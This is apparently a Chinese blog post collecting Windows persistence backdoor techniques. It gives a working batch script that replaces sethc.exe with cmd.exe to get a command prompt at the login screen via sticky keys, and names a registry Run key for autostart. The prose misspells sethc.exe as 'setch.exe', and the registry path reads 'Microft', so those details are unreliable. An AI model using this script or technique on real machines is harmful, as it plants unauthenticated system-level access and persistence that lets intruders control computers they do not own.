---
layout: post
title: 持久化后门维持-Windows篇(updating)
---

> 文章长期更新，用来统计收集后门维持的各种方法。



## 0x01 shift后门(替换系统文件)

通过修改`setch.exe`来达到持久化后门

在低版本的windows中，我们可以直接把`C:\Windows\System32\`下`setch.exe`

替换成我们的后门程序，在登陆界面按5次shift即可出现cmd

![0x01](https://tva1.sinaimg.cn/large/00831rSTly1gcxuu947nsj31500dmabt.jpg)

![image-20200318140637169](https://tva1.sinaimg.cn/large/00831rSTly1gcy1rc9ccsj314k0lq411.jpg)



![0x02](https://tva1.sinaimg.cn/large/00831rSTly1gcxwxpnwzoj30hy0i6ab8.jpg)

```bash
@echo off
c:
cd\
cd Windows\System32
icacls sethc.exe /grant Administrator:f
del sethc.exe 
copy cmd.exe sethc.exe
pause&&exit
```

保存为.bat文件运行即可留下shift后门



###  0x02 注册表自启动

> 最常见的在指定键值添加一个新的键值类型为REG_SZ,数据项中添写需要运行程序的路径即可以启动，此类操作一些较为敏感容易被本地AV拦截，目前也是较为常见的一种方式。

`HKEY_LOCAL_MACHINE\SOFTWARE\Microft\windows\currentversion\run`

![0x03](https://tva1.sinaimg.cn/large/00831rSTly1gcy2iagbjuj317q0l4n3h.jpg)

<img src="https://tva1.sinaimg.cn/large/00831rSTly1gcy2lfca5ej32ls0n617q.jpg" alt="0x04" style="zoom:150%;" />



